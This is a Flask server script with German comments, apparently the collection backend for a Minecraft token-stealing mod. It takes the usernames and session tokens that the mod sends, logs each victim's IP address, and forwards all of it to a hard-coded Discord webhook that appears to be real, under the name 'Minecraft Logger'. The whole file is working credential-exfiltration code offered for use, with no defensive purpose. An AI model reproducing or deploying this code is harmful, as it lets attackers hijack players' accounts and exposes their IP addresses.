from flask import Flask, request, jsonify
import requests
import json
from datetime import datetime

# DIE WICHTIGSTE ZEILE FÜR VERCEL:
app = Flask(__name__)

# HIER DEINE DISCORD WEBHOOK URL EINTRAGEN:
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1493597798292127875/vP2BJERnoRPQ4chSvDY0aY_sE1B4ES-tn1SQJdMiwqT0UPxAXvXbYVZqawSqPWX2hY8g"

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers['X-Forwarded-For'].split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        return request.headers['X-Real-IP']
    return request.remote_addr

def send_to_discord(username, token, ip):
    if not DISCORD_WEBHOOK_URL or "DEINE_ID" in DISCORD_WEBHOOK_URL:
        print("ERROR: Discord webhook URL not configured!")
        return False
    
    try:
        # Minecraft Kopf Bild
        head_url = f"https://minotar.net/helm/{username}/100.png"
        
        embed = {
            "title": "🚨 Neue Minecraft Session",
            "color": 0xff0000,
            "description": f"**Spieler:** {username}\n**IP:** {ip}",
            "fields": [
                {
                    "name": "🔑 Session Token",
                    "value": f"```{token[:200]}```",
                    "inline": False
                }
            ],
            "thumbnail": {"url": head_url},
            "timestamp": datetime.utcnow().isoformat(),
            "footer": {"text": "Minecraft Logger"}
        }
        
        payload = {
            "username": "Minecraft Logger",
            "embeds": [embed]
        }
        
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=10)
        return response.status_code in [200, 204]
        
    except Exception as e:
        print(f"Discord error: {e}")
        return False

@app.route('/receive', methods=['POST'])
def receive():
    """Haupt-Endpoint für deine Minecraft Mod"""
    data = request.json
    
    if not data:
        return jsonify({"status": "error", "message": "No JSON data"}), 400
    
    username = data.get('username')
    token = data.get('token')
    ip = get_client_ip()
    
    print(f"📥 Received - User: {username}, IP: {ip}, Token length: {len(token) if token else 0}")
    
    if not username or not token:
        return jsonify({"status": "error", "message": "Missing username or token"}), 400
    
    # An Discord senden
    success = send_to_discord(username, token, ip)
    
    if success:
        return jsonify({"status": "success", "message": f"Data for {username} sent to Discord"}), 200
    else:
        return jsonify({"status": "error", "message": "Failed to send to Discord"}), 500

@app.route('/', methods=['GET'])
def health():
    """Health check für Vercel"""
    return jsonify({"status": "alive", "endpoint": "/receive"}), 200

@app.route('/auth', methods=['POST'])
def auth():
    return jsonify({"status": "error", "message": "Use /receive endpoint"}), 404
